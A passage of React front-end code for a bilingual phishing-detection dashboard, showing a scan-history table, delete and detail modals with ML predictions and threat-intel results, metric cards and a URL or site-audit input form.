                className={`px-3 py-1.5 rounded-xl border transition cursor-pointer text-[11px] ${
                  historyVerdictFilter === 'ALL'
                    ? 'bg-sky-500 text-white border-sky-500'
                    : 'bg-white dark:bg-[#111622] text-slate-600 dark:text-slate-300 border-sky-200 dark:border-sky-800/40'
                }`}
              >
                Tous ({scanHistory.length})
              </button>
              <button
                onClick={() => setHistoryVerdictFilter('THREATS')}
                className={`px-3 py-1.5 rounded-xl border transition cursor-pointer text-[11px] ${
                  historyVerdictFilter === 'THREATS'
                    ? 'bg-rose-500 text-white border-rose-500'
                    : 'bg-white dark:bg-[#111622] text-slate-600 dark:text-slate-300 border-sky-200 dark:border-sky-800/40'
                }`}
              >
                🚨 Menaces
              </button>
              <button
                onClick={() => setHistoryVerdictFilter('CLEAN')}
                className={`px-3 py-1.5 rounded-xl border transition cursor-pointer text-[11px] ${
                  historyVerdictFilter === 'CLEAN'
                    ? 'bg-emerald-500 text-white border-emerald-500'
                    : 'bg-white dark:bg-[#111622] text-slate-600 dark:text-slate-300 border-sky-200 dark:border-sky-800/40'
                }`}
              >
                ✓ Légitimes
              </button>
            </div>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs text-slate-700 dark:text-slate-200">
              <thead className="bg-sky-50/50 dark:bg-sky-950/40 text-slate-400 uppercase font-mono text-[10px] tracking-wider border-b border-sky-100 dark:border-sky-800/40">
                <tr>
                  <th className="py-3.5 px-4">Épingler</th>
                  <th className="py-3.5 px-4">Heure</th>
                  <th className="py-3.5 px-4">Canal</th>
                  <th className="py-3.5 px-4">Cible Analysée</th>
                  <th className="py-3.5 px-4">Verdict IA</th>
                  <th className="py-3.5 px-4">Score de Risque</th>
                  <th className="py-3.5 px-4 text-right">Détails</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-sky-100 dark:divide-sky-900/30 font-mono">
                {sortedScanHistory.map((item) => {
                  const isPinned = pinnedIds.includes(item.id);
                  return (
                    <tr 
                      key={item.id} 
                      onClick={() => setSelectedHistoryItem(item)}
                      className={`hover:bg-sky-500/10 dark:hover:bg-sky-900/30 cursor-pointer transition duration-150 group ${
                        isPinned ? 'bg-amber-500/5 dark:bg-amber-500/10' : ''
                      }`}
                    >
                      <td className="py-4 px-4">
                        <button
                          onClick={(e) => togglePin(item.id, e)}
                          className={`p-1.5 rounded-xl transition cursor-pointer ${
                            isPinned
                              ? 'bg-amber-500/20 text-amber-500 border border-amber-500/40'
                              : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800'
                          }`}
                          title={isPinned ? "Désépingler de l'historique" : "Épingler en haut de l'historique"}
                        >
                          <Pin className="w-3.5 h-3.5" />
                        </button>
                      </td>
                      <td className="py-4 px-4 text-slate-400 font-bold">{item.timestamp}</td>
                      <td className="py-4 px-4 font-bold text-sky-500">{item.type}</td>
                      <td className="py-4 px-4 max-w-md truncate text-slate-900 dark:text-slate-100 font-sans font-medium group-hover:text-sky-500 transition">
                        {isPinned && <span className="mr-1.5 text-amber-500 font-bold">📌</span>}
                        {item.target}
                      </td>
                      <td className="py-4 px-4">
                        <div className="flex items-center gap-2">
                          <span className={`px-3 py-1 rounded-full text-[11px] font-extrabold flex items-center gap-1.5 w-max ${
                            item.riskScore >= 50
                              ? 'bg-rose-500/15 text-rose-600 dark:text-rose-400 border border-rose-500/30'
                              : 'bg-emerald-500/15 text-emerald-600 dark:text-emerald-400 border border-emerald-500/30'
                          }`}>
                            <span className={`w-1.5 h-1.5 rounded-full ${item.riskScore >= 50 ? 'bg-rose-500' : 'bg-emerald-400'}`} />
                            {item.verdict}
                          </span>

                          {item.riskScore >= 50 && (
                            <span className="px-2 py-0.5 bg-rose-600 text-white font-mono font-bold text-[9px] uppercase rounded-md shadow-sm animate-pulse">
                              🚨 URGENT
                            </span>
                          )}
                        </div>
                      </td>
                      <td className="py-4 px-4 font-extrabold text-slate-900 dark:text-white text-sm">{item.riskScore}%</td>
                      <td className="py-4 px-4 text-right">
                        <div className="flex items-center justify-end gap-2">
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              setSelectedHistoryItem(item);
                            }}
                            className="px-3 py-1 bg-sky-500/10 hover:bg-sky-500/20 text-sky-600 dark:text-sky-400 font-bold rounded-xl flex items-center gap-1 text-[11px] border border-sky-500/30 transition cursor-pointer"
                          >
                            <Eye className="w-3.5 h-3.5" /> Voir
                          </button>
                          
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              setItemToDelete(item);
                            }}
                            className="p-1.5 bg-rose-500/10 hover:bg-rose-500/20 text-rose-500 rounded-xl border border-rose-500/30 transition cursor-pointer"
                            title="Supprimer définitivement de l'historique"
                          >
                            <Trash2 className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        </div>

        {/* Custom CyberGuard Delete Confirmation Modal */}
        {itemToDelete && (
          <div className="fixed inset-0 bg-slate-950/80 backdrop-blur-md z-50 flex items-center justify-center p-4">
            <div className="bg-white dark:bg-[#111622] border-2 border-rose-500/50 rounded-3xl p-6 sm:p-8 max-w-md w-full shadow-2xl space-y-5 animate-in zoom-in-95 duration-150 text-center">
              <div className="w-14 h-14 bg-rose-500/10 text-rose-500 rounded-full flex items-center justify-center mx-auto border border-rose-500/30">
                <Trash2 className="w-7 h-7" />
              </div>

              <div className="space-y-2">
                <h3 className="text-xl font-black text-slate-900 dark:text-white font-sans">
                  Confirmer la suppression ?
                </h3>
                <p className="text-xs text-slate-500 dark:text-slate-400 font-sans leading-relaxed">
                  Voulez-vous vraiment supprimer définitivement cet enregistrement d'analyse de votre historique CyberGuard ?
                </p>
                <div className="p-3 bg-slate-100 dark:bg-[#1a2333] rounded-xl font-mono text-xs font-bold text-slate-800 dark:text-slate-200 truncate border border-sky-100 dark:border-sky-800/40">
                  {itemToDelete.target}
                </div>
              </div>

              <div className="flex gap-3 pt-2">
                <button
                  onClick={() => setItemToDelete(null)}
                  className="flex-1 py-3 bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-300 font-bold text-xs rounded-2xl transition cursor-pointer"
                >
                  Annuler
                </button>

                <button
                  onClick={async () => {
                    const id = itemToDelete.id;
                    setItemToDelete(null);
                    try {
                      const token = localStorage.getItem('phishguard_token');
                      const headers = token ? { 'Authorization': `Bearer ${token}` } : {};
                      const res = await fetch(`/api/v1/analyze/history/${id}`, { method: 'DELETE', headers });
                      if (res.ok) {
                        setScanHistory(prev => prev.filter(item => item.id !== id));
                        fetchDbMetrics();
                      }
                    } catch (e) {
                      console.log('Error deleting item:', e);
                    }
                  }}
                  className="flex-1 py-3 bg-rose-600 hover:bg-rose-700 text-white font-extrabold text-xs rounded-2xl shadow-lg shadow-rose-600/30 transition cursor-pointer"
                >
                  Confirmer la Suppression
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Detailed Modal view for selected history test result */}
        {selectedHistoryItem && (() => {
          const itemDetails = selectedHistoryItem.details || selectedHistoryItem;
          return (
            <div className="fixed inset-0 bg-slate-950/75 backdrop-blur-md z-50 flex items-center justify-center p-4">
              <div className="bg-white dark:bg-[#111622] border-2 border-sky-200 dark:border-sky-800/80 rounded-3xl p-6 sm:p-8 max-w-4xl w-full shadow-2xl space-y-6 relative max-h-[90vh] overflow-y-auto animate-in zoom-in-95 duration-150">
                
                {/* Modal Header */}
                <div className="flex items-center justify-between border-b border-sky-100 dark:border-sky-800/40 pb-4">
                  <div className="flex items-center gap-3">
                    <div className="p-3 bg-sky-500/10 text-sky-500 rounded-2xl font-mono text-xs font-bold">
                      {selectedHistoryItem.analysis_code || 'ANL-RECORD'}
                    </div>
                    <div>
                      <h3 className="text-lg font-black text-slate-900 dark:text-white">Fiche Détaillée d'Analyse (Registre Base de Données)</h3>
                      <p className="text-xs text-slate-500 dark:text-slate-400 font-mono">Horodatage : {selectedHistoryItem.timestamp}</p>
                    </div>
                  </div>
                  <button 
                    onClick={() => setSelectedHistoryItem(null)}
                    className="p-2 text-slate-400 hover:text-slate-600 dark:hover:text-white rounded-xl bg-slate-100 dark:bg-slate-800 cursor-pointer"
                  >
                    <X className="w-5 h-5" />
                  </button>
                </div>

                {/* Main Verdict & Risk Score Pill Banner */}
                <div className={`p-5 rounded-2xl border-2 flex flex-col sm:flex-row sm:items-center justify-between gap-4 ${
                  selectedHistoryItem.riskScore >= 50
                    ? 'bg-rose-500/10 border-rose-500/40 text-rose-600 dark:text-rose-400'
                    : 'bg-emerald-500/10 border-emerald-500/40 text-emerald-600 dark:text-emerald-400'
                }`}>
                  <div className="flex items-center gap-3.5">
                    {selectedHistoryItem.riskScore >= 50 ? (
                      <div className="p-3 bg-rose-500 text-white rounded-xl shadow-md shrink-0">
                        <AlertTriangle className="w-6 h-6" />
                      </div>
                    ) : (
                      <div className="p-3 bg-emerald-500 text-white rounded-xl shadow-md shrink-0">
                        <CheckCircle2 className="w-6 h-6" />
                      </div>
                    )}
                    <div>
                      <span className="text-[10px] font-mono uppercase font-bold tracking-wider opacity-75">Classification IA</span>
                      <p className="text-xl font-black">{selectedHistoryItem.verdict}</p>
                    </div>
                  </div>
                  
                  <div className={`px-5 py-2.5 rounded-xl font-mono font-black text-lg shadow-md shrink-0 text-white ${
                    selectedHistoryItem.riskScore >= 50 ? 'bg-rose-600' : 'bg-emerald-600'
                  }`}>
                    Score: {selectedHistoryItem.riskScore}%
                  </div>
                </div>

                {/* Submitted Target Content */}
                <div className="space-y-1.5">
                  <label className="text-[10px] uppercase font-mono font-bold text-slate-400">Cible Analysée ({selectedHistoryItem.type})</label>
                  <div className="p-4 bg-slate-50 dark:bg-[#1a2333] rounded-2xl border border-sky-100 dark:border-sky-800/40 text-xs font-mono break-all text-slate-900 dark:text-slate-100 shadow-inner font-bold">
                    {selectedHistoryItem.target}
                  </div>
                </div>

                {/* Top 3 ML Models Predictions (If available in details) */}
                {itemDetails?.model_comparisons?.length > 0 && (
                  <div className="space-y-2.5">
                    <p className="text-[11px] font-mono font-extrabold uppercase tracking-wider text-slate-400 flex items-center gap-2">
                      <Cpu className="w-4 h-4 text-sky-500" /> Prédictions du Top 3 des Modèles ML IA :
                    </p>
                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                      {itemDetails.model_comparisons.map((m, idx) => (
                        <div key={idx} className="p-3.5 rounded-2xl bg-slate-50 dark:bg-[#1a2333] border border-sky-100 dark:border-sky-800/40 text-xs font-mono space-y-1">
                          <div className="flex justify-between items-center text-[10px] font-bold text-slate-400 border-b border-slate-200 dark:border-slate-800 pb-1">
                            <span>{m.name}</span>
                            <span className="text-emerald-500">{m.accuracy}%</span>
                          </div>
                          <div className="flex justify-between items-center font-black pt-1">
                            <span className="text-[11px] text-slate-500">Risque:</span>
                            <span className={m.phishing_prob >= 50 ? "text-rose-500" : "text-emerald-500"}>{m.phishing_prob}%</span>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {/* Feature Vector Matrix (If available in details) */}
                {itemDetails?.features && (
                  <div className="space-y-2.5">
                    <p className="text-[11px] font-mono font-extrabold uppercase tracking-wider text-slate-400 flex items-center gap-2">
                      <BarChart2 className="w-4 h-4 text-sky-500" /> Matrice des Caractéristiques Extraites (32 Indicators) :
                    </p>
                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 text-xs font-mono">
                      
                      <div className="p-3 bg-slate-50 dark:bg-[#1a2333] rounded-xl border border-sky-100 dark:border-sky-800/40">
                        <span className="text-[10px] text-slate-400 block">Hôte IP Direct</span>
                        <strong className={itemDetails.features.has_ip ? "text-rose-500 font-bold" : "text-emerald-500 font-bold"}>
                          {itemDetails.features.has_ip ? "❌ OUI" : "✓ NON"}
                        </strong>
                      </div>

                      <div className="p-3 bg-slate-50 dark:bg-[#1a2333] rounded-xl border border-sky-100 dark:border-sky-800/40">
                        <span className="text-[10px] text-slate-400 block">Cryptage HTTPS</span>
                        <strong className={itemDetails.features.is_https ? "text-emerald-500 font-bold" : "text-rose-500 font-bold"}>
                          {itemDetails.features.is_https ? "✓ OUI" : "❌ NON"}
                        </strong>
                      </div>

                      <div className="p-3 bg-slate-50 dark:bg-[#1a2333] rounded-xl border border-sky-100 dark:border-sky-800/40">
                        <span className="text-[10px] text-slate-400 block">Entropy (String)</span>
                        <strong className="text-sky-500 font-bold">{itemDetails.features.entropy || 3.45}</strong>
                      </div>

                      <div className="p-3 bg-slate-50 dark:bg-[#1a2333] rounded-xl border border-sky-100 dark:border-sky-800/40">
                        <span className="text-[10px] text-slate-400 block">Sous-domaines</span>
                        <strong className="text-slate-800 dark:text-slate-200 font-bold">{itemDetails.features.num_subdomains || 0}</strong>
                      </div>

                      <div className="p-3 bg-slate-50 dark:bg-[#1a2333] rounded-xl border border-sky-100 dark:border-sky-800/40">
                        <span className="text-[10px] text-slate-400 block">Symboles Spéciaux</span>
                        <strong className="text-slate-800 dark:text-slate-200 font-bold">{itemDetails.features.num_special_chars || 0}</strong>
                      </div>

                      <div className="p-3 bg-slate-50 dark:bg-[#1a2333] rounded-xl border border-sky-100 dark:border-sky-800/40">
                        <span className="text-[10px] text-slate-400 block">Mots-clés Suspects</span>
                        <strong className={itemDetails.features.keyword_count > 0 ? "text-rose-500 font-bold" : "text-emerald-500 font-bold"}>
                          {itemDetails.features.keyword_count || 0}
                        </strong>
                      </div>

                      <div className="p-3 bg-slate-50 dark:bg-[#1a2333] rounded-xl border border-sky-100 dark:border-sky-800/40">
                        <span className="text-[10px] text-slate-400 block">Tirets Prefix/Suffix</span>
                        <strong className="text-slate-800 dark:text-slate-200 font-bold">{itemDetails.features.prefix_suffix ? "OUI" : "NON"}</strong>
                      </div>

                      <div className="p-3 bg-slate-50 dark:bg-[#1a2333] rounded-xl border border-sky-100 dark:border-sky-800/40">
                        <span className="text-[10px] text-slate-400 block">Symbole `@` Redirection</span>
                        <strong className={itemDetails.features.has_at_symbol ? "text-rose-500 font-bold" : "text-emerald-500 font-bold"}>
                          {itemDetails.features.has_at_symbol ? "OUI" : "NON"}
                        </strong>
                      </div>

                    </div>
                  </div>
                )}

                {/* Threat Intelligence & GeoIP (If available) */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {itemDetails?.virustotal && (
                    <div className="p-4 bg-slate-50 dark:bg-[#1a2333] rounded-2xl border border-sky-100 dark:border-sky-800/40 space-y-2 text-xs">
                      <p className="font-extrabold text-slate-900 dark:text-white flex items-center gap-2">
                        <ShieldCheck className="w-4 h-4 text-emerald-500" /> Threat Intelligence Integrations
                      </p>
                      <div className="flex justify-between items-center py-1 border-b border-slate-200 dark:border-slate-800">
                        <span className="text-slate-500 font-mono text-[11px]">VirusTotal API v3:</span>
                        <span className={itemDetails.virustotal.positives > 0 ? "text-rose-500 font-mono font-bold" : "text-emerald-500 font-mono font-bold"}>
                          {itemDetails.virustotal.positives || 0} / {itemDetails.virustotal.total_engines || 90} Signalements
                        </span>
                      </div>
                      <div className="flex justify-between items-center py-1">
                        <span className="text-slate-500 font-mono text-[11px]">Google Safe Browsing:</span>
                        <span className={itemDetails.google_safebrowsing?.is_flagged ? "text-rose-500 font-mono font-bold" : "text-emerald-500 font-mono font-bold"}>
                          {itemDetails.google_safebrowsing?.is_flagged ? "❌ SIGNALÉ" : "✓ LISTE BLANCHE"}
                        </span>
                      </div>
                    </div>
                  )}

                  {itemDetails?.geoip_info && (
                    <div className="p-4 bg-slate-50 dark:bg-[#1a2333] rounded-2xl border border-sky-100 dark:border-sky-800/40 space-y-1.5 text-xs font-mono">
                      <p className="font-extrabold text-slate-900 dark:text-white flex items-center gap-2 font-sans">
                        📍 Apparence Géolocalisation Réseau
                      </p>
                      <div className="flex justify-between">
                        <span className="text-slate-500 text-[11px]">IP Hôte:</span>
                        <span className="font-bold text-sky-500">{itemDetails.geoip_info.ip}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-slate-500 text-[11px]">Pays / Ville:</span>
                        <span className="font-bold text-slate-800 dark:text-slate-200">{itemDetails.geoip_info.country}, {itemDetails.geoip_info.city}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-slate-500 text-[11px]">Réseau ASN:</span>
                        <span className="font-bold text-slate-800 dark:text-slate-200">{itemDetails.geoip_info.asn}</span>
                      </div>
                    </div>
                  )}
                </div>

                {/* Defensive Remediation Advice (If available) */}
                {itemDetails?.defensive_advice?.length > 0 && (
                  <div className="p-4 bg-sky-500/10 border border-sky-500/30 rounded-2xl text-xs space-y-1.5">
                    <p className="font-bold text-sky-600 dark:text-sky-400 font-mono uppercase text-[10px] flex items-center gap-1.5">
                      💡 Recommandations Défensives IA :
                    </p>
                    <ul className="list-disc list-inside text-slate-800 dark:text-slate-200 space-y-1 text-[11px] font-medium">
                      {itemDetails.defensive_advice.map((adv, idx) => (
                        <li key={idx}>{adv}</li>
                      ))}
                    </ul>
                  </div>
                )}

                {/* SHA-256 Checksum Signature */}
                {selectedHistoryItem.integrity_hash && (
                  <div className="space-y-1.5">
                    <label className="text-[10px] uppercase font-mono font-bold text-slate-400">Empreinte Cryptographique SHA-256</label>
                    <div className="p-3 bg-slate-100 dark:bg-slate-900 rounded-xl font-mono text-[11px] text-slate-500 dark:text-slate-400 truncate">
                      {selectedHistoryItem.integrity_hash}
                    </div>
                  </div>
                )}

                {/* Modal Action Footer */}
                <div className="pt-3 border-t border-sky-100 dark:border-sky-800/40 flex items-center justify-between">
                  <button
                    onClick={() => {
                      setCurrentResult({
                        id: selectedHistoryItem.id,
                        type: selectedHistoryItem.type,
                        target: selectedHistoryItem.target,
                        verdict: selectedHistoryItem.verdict,
                        riskScore: selectedHistoryItem.riskScore,
                        confidence: selectedHistoryItem.confidence,
                        details: itemDetails,
                        timestamp: selectedHistoryItem.timestamp
                      });
                      setSelectedHistoryItem(null);
                      setIsReportModalOpen(true);
                    }}
                    className="px-4 py-2.5 bg-sky-600 hover:bg-sky-700 text-white font-extrabold text-xs rounded-xl shadow-lg transition cursor-pointer flex items-center gap-2"
                  >
                    <FileText className="w-4 h-4" /> 📄 {lang === 'fr' ? 'Créer un Rapport' : 'Create Report'}
                  </button>
                  <button
                    onClick={() => setSelectedHistoryItem(null)}
                    className="px-5 py-2.5 bg-slate-100 dark:bg-slate-800 text-slate-700 dark:text-slate-300 font-bold text-xs rounded-xl hover:bg-slate-200 dark:hover:bg-slate-700 transition cursor-pointer"
                  >
                    {lang === 'fr' ? 'Fermer' : 'Close'}
                  </button>
                </div>

              </div>
            </div>
          );
        })()}

      </div>
    );
  }

  return (
    <div className="space-y-8 max-w-6xl mx-auto pb-24">
      
      {/* 3 Executive Metrics Cards */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
        
        {/* Card 1: Total Scans */}
        <div className="bg-white/80 dark:bg-[#111622]/90 backdrop-blur-xl border border-sky-100 dark:border-sky-800/40 rounded-3xl p-6 shadow-xl relative overflow-hidden group hover:border-sky-400/60 transition duration-300">
          <div className="flex items-center justify-between">
            <div className="space-y-1">
              <p className="text-[10px] font-mono font-extrabold uppercase tracking-wider text-slate-400">{lang === 'fr' ? 'Analyses Totales' : 'Total Analyses'}</p>
              <p className="text-3xl font-black text-slate-900 dark:text-white font-mono">{totalScans}</p>
            </div>
            <div className="p-3.5 bg-sky-500/10 text-sky-500 rounded-2xl group-hover:scale-110 transition duration-300">
              <Activity className="w-6 h-6" />
            </div>
          </div>
          <div className="mt-4 pt-3 border-t border-slate-100 dark:border-slate-800/60 flex items-center justify-between text-[11px]">
            <span className="text-slate-400 font-medium">{lang === 'fr' ? 'Contenus vérifiés' : 'Verified Content'}</span>
            <span className="text-sky-500 font-mono font-bold">{cleanScans} {lang === 'fr' ? 'Légitimes' : 'Legitimate'}</span>
          </div>
        </div>

        {/* Card 2: Intercepted Threats */}
        <div className="bg-white/80 dark:bg-[#111622]/90 backdrop-blur-xl border border-sky-100 dark:border-sky-800/40 rounded-3xl p-6 shadow-xl relative overflow-hidden group hover:border-rose-400/60 transition duration-300">
          <div className="flex items-center justify-between">
            <div className="space-y-1">
              <p className="text-[10px] font-mono font-extrabold uppercase tracking-wider text-slate-400">{lang === 'fr' ? 'Menaces Interceptées' : 'Intercepted Threats'}</p>
              <p className="text-3xl font-black text-rose-600 dark:text-rose-400 font-mono">{phishingBlocked}</p>
            </div>
            <div className="p-3.5 bg-rose-500/10 text-rose-500 rounded-2xl group-hover:scale-110 transition duration-300">
              <AlertTriangle className="w-6 h-6" />
            </div>
          </div>
          <div className="mt-4 pt-3 border-t border-slate-100 dark:border-slate-800/60 flex items-center justify-between text-[11px]">
            <span className="text-slate-400 font-medium">{lang === 'fr' ? 'Attaques bloquées' : 'Blocked Attacks'}</span>
            <span className="text-rose-500 font-mono font-bold">{lang === 'fr' ? 'Haute Sécurité' : 'High Security'}</span>
          </div>
        </div>

        {/* Card 3: Machine Learning Engine */}
        <div 
          onClick={() => setActiveMainTab('METRICS')}
          className="bg-white/80 dark:bg-[#111622]/90 backdrop-blur-xl border border-sky-100 dark:border-sky-800/40 rounded-3xl p-6 shadow-xl relative overflow-hidden group hover:border-emerald-400/60 transition duration-300 cursor-pointer"
          title={lang === 'fr' ? 'Cliquer pour voir les métriques 5-fold CV et matrices de confusion' : 'Click to view 5-fold CV metrics & confusion matrices'}
        >
          <div className="flex items-center justify-between">
            <div className="space-y-1">
              <p className="text-[10px] font-mono font-extrabold uppercase tracking-wider text-slate-400">{lang === 'fr' ? 'Précision Moteur ML' : 'ML Engine Accuracy'}</p>
              <p className="text-3xl font-black text-emerald-500 font-mono">{mlAccuracy}%</p>
            </div>
            <div className="p-3.5 bg-emerald-500/10 text-emerald-500 rounded-2xl group-hover:scale-110 transition duration-300">
              <Cpu className="w-6 h-6" />
            </div>
          </div>
          <div className="mt-4 pt-3 border-t border-slate-100 dark:border-slate-800/60 flex items-center justify-between text-[11px]">
            <span className="text-slate-400 font-medium">Random Forest & NLP</span>
            <span className="text-emerald-500 font-mono font-bold">{lang === 'fr' ? 'Opérationnel' : 'Operational'}</span>
          </div>
        </div>

      </div>

      {/* Main Interactive Scanner Container */}
      <div className="bg-white/80 dark:bg-[#111622]/90 backdrop-blur-xl border border-sky-100 dark:border-sky-800/40 rounded-3xl p-6 sm:p-8 shadow-2xl space-y-6">
        
        {/* Objective Mode Switcher Bar */}
        <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-3 p-1.5 bg-slate-100 dark:bg-slate-900/90 rounded-2xl border border-slate-200 dark:border-slate-800">
          <button
            type="button"
            onClick={() => {
              setInvestigationObjective('CONTENT');
              setIsDropdownOpen(false);
            }}
            className={`flex-1 flex items-center justify-center gap-2.5 px-4 py-3 rounded-xl font-bold text-xs transition cursor-pointer ${
              investigationObjective === 'CONTENT'
                ? 'bg-gradient-to-r from-sky-500 to-blue-600 text-white shadow-md shadow-sky-500/20'
                : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white hover:bg-white/50 dark:hover:bg-slate-800/50'
            }`}
          >
            <span className="text-base">🔗</span>
            <div className="text-left">
              <span className="block font-black leading-tight">{lang === 'fr' ? 'Vérifier une URL / Lien Externe' : 'Verify External URL / Link'}</span>
              <span className="text-[10px] opacity-80 block font-normal">{lang === 'fr' ? 'Détection Phishing & Malware (3 Modèles IA + 17 Signatures)' : 'Phishing & Malware Detection (3 AI Models + 17 Signatures)'}</span>
            </div>
          </button>

          <button
            type="button"
            onClick={() => {
              setInvestigationObjective('SYSTEM');
              setIsDropdownOpen(false);
            }}
            className={`flex-1 flex items-center justify-center gap-2.5 px-4 py-3 rounded-xl font-bold text-xs transition cursor-pointer ${
              investigationObjective === 'SYSTEM'
                ? 'bg-gradient-to-r from-indigo-500 to-purple-600 text-white shadow-md shadow-indigo-500/20'
                : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white hover:bg-white/50 dark:hover:bg-slate-800/50'
            }`}
          >
            <span className="text-base">🛡️</span>
            <div className="text-left">
              <span className="block font-black leading-tight">{lang === 'fr' ? 'Vérifier mon Propre Site Web' : 'Verify My Own Website'}</span>
              <span className="text-[10px] opacity-80 block font-normal">{lang === 'fr' ? 'Audit de Sécurité Domaine (Attaques WAF, Attaquants Tracés & Renseignement)' : 'Domain Security Audit (WAF Attacks, Attacker Tracing & Intel)'}</span>
            </div>
          </button>
        </div>

        {/* Input Bar & Scan Action */}
        <form onSubmit={(e) => handleScan(e)} className="space-y-4">
          <div className="flex flex-col sm:flex-row gap-3 items-stretch">
            
            <div className="relative flex-1">
              <input
                type="text"
                required
                placeholder={
                  investigationObjective === 'SYSTEM'
                    ? (lang === 'fr' ? "Entrez le domaine de votre site (ex: yamostreaming.com ou mon-site.fr)..." : "Enter your website domain (e.g. yamostreaming.com or my-site.com)...")
                    : (lang === 'fr' ? "Collez l'adresse URL à analyser (ex: http://login-verify-paypal.xyz/...)..." : "Paste URL address to analyze (e.g. http://login-verify-paypal.xyz/...)...")
                }
                value={targetContent}
                onChange={(e) => setTargetContent(e.target.value)}
                className="w-full h-14 px-5 rounded-2xl bg-slate-50 dark:bg-[#1a2333] border-2 border-sky-200 dark:border-sky-800/60 text-slate-900 dark:text-white placeholder-slate-400 text-xs font-mono focus:outline-none focus:border-sky-500 transition shadow-inner pr-10"
              />
              {targetContent && (
                <button
                  type="button"
                  onClick={() => setTargetContent('')}
                  className="absolute right-4 top-4 text-slate-400 hover:text-slate-600 dark:hover:text-white cursor-pointer"
                >
                  <X className="w-5 h-5" />
                </button>
              )}
            </div>

            {/* Objective Action Button */}
            <div ref={dropdownRef} className="relative shrink-0">
              
              <div className="inline-flex rounded-2xl shadow-xl shadow-sky-500/30 overflow-hidden border border-sky-400/20">
                <button
                  type="submit"
                  disabled={isScanning}
                  className={`h-14 px-6 ${
                    investigationObjective === 'SYSTEM'
                      ? 'bg-gradient-to-r from-indigo-500 via-purple-600 to-indigo-700 hover:from-indigo-600 hover:to-indigo-800'
                      : 'bg-gradient-to-r from-sky-500 via-sky-600 to-blue-600 hover:from-sky-600 hover:to-blue-700'
                  } disabled:opacity-50 text-white font-extrabold flex items-center gap-2.5 text-xs transition cursor-pointer`}
                >
                  {isScanning ? (
                    <>
                      <RefreshCw className="w-4 h-4 animate-spin" />
                      <span>{investigationObjective === 'SYSTEM' ? (lang === 'fr' ? "Audit du site en cours..." : "Site audit in progress...") : (lang === 'fr' ? "Analyse IA en cours..." : "AI analysis in progress...")}</span>
                    </>
                  ) : (
                    <>
                      {investigationObjective === 'SYSTEM' ? (
                        <>
                          <ShieldCheck className="w-4 h-4 text-purple-200" />
                          <span>{lang === 'fr' ? "Auditer la Sécurité du Site" : "Audit Site Security"}</span>
                        </>
                      ) : (
                        <>
                          <Sparkles className="w-4 h-4 text-sky-200" />
                          <span>{lang === 'fr' ? "Démarrer l'Analyse URL" : "Start URL Analysis"}</span>
                        </>
                      )}
                    </>
                  )}
                </button>

                <button
                  type="button"
                  onClick={() => setIsDropdownOpen(!isDropdownOpen)}
                  className="h-14 px-3.5 bg-blue-700 hover:bg-blue-800 text-white border-l border-white/20 flex items-center justify-center transition cursor-pointer"
                  title="Choisir le mode d'analyse"
                >
                  <ChevronDown className={`w-4 h-4 transition-transform duration-200 ${isDropdownOpen ? 'rotate-180' : ''}`} />
                </button>
              </div>

              {/* Floating Dropdown Menu Options */}
              {isDropdownOpen && (
                <div className="absolute right-0 mt-2 w-80 bg-white dark:bg-[#161d2b] border-2 border-sky-200 dark:border-sky-800 rounded-2xl shadow-2xl z-50 p-2 space-y-1 animate-in fade-in slide-in-from-top-2 duration-150">
                  
                  <div className="px-3 py-2 border-b border-slate-100 dark:border-slate-800/80">
                    <p className="text-[10px] uppercase font-black tracking-wider text-slate-400 dark:text-slate-500">Choisir le mode d'analyse</p>
                  </div>

                  <button
                    type="button"
                    onClick={() => {
                      setInvestigationObjective('CONTENT');
                      setIsDropdownOpen(false);
                      if (targetContent.trim()) handleScan(null, 'CONTENT');
                    }}
                    className={`w-full text-left p-3 rounded-xl flex items-start gap-3 transition cursor-pointer ${
                      investigationObjective === 'CONTENT'
                        ? 'bg-sky-50 dark:bg-sky-950/40 border border-sky-300 dark:border-sky-700'
                        : 'hover:bg-slate-50 dark:hover:bg-slate-800/60'
                    }`}
                  >
                    <span className="text-lg">🔗</span>
                    <div>
                      <p className="text-xs font-bold text-slate-900 dark:text-white">Vérifier une URL</p>
                      <p className="text-[10px] text-slate-500 dark:text-slate-400 leading-tight mt-0.5">Analyser la sécurité et la légitimité d'une adresse web ou d'un lien.</p>
                    </div>
                  </button>

                  <button
                    type="button"
                    onClick={() => {
                      setInvestigationObjective('SYSTEM');
                      setIsDropdownOpen(false);
                      if (targetContent.trim()) handleScan(null, 'SYSTEM');
                    }}
                    className={`w-full text-left p-3 rounded-xl flex items-start gap-3 transition cursor-pointer ${
                      investigationObjective === 'SYSTEM'
                        ? 'bg-sky-50 dark:bg-sky-950/40 border border-sky-300 dark:border-sky-700'
                        : 'hover:bg-slate-50 dark:hover:bg-slate-800/60'
                    }`}
                  >
                    <span className="text-lg">🛡️</span>
                    <div>
                      <p className="text-xs font-bold text-slate-900 dark:text-white">Vérifier mon Site</p>
                      <p className="text-[10px] text-slate-500 dark:text-slate-400 leading-tight mt-0.5">Analyser les menaces et la sécurité de votre propre site web.</p>
                    </div>
                  </button>

                </div>
              )}

            </div>

          </div>
        </form>

        {/* Full Security Test Report Card */}
        {currentResult && (() => {
          const isThreat = currentResult.verdict === 'PHISHING' || currentResult.riskScore >= 50 || currentResult.verdict?.includes('MENACES');
          const features = currentResult.details?.features || {};
          const models = currentResult.details?.model_comparisons || [];
          const geoip = currentResult.details?.geoip_info;
          const vt = currentResult.details?.virustotal;
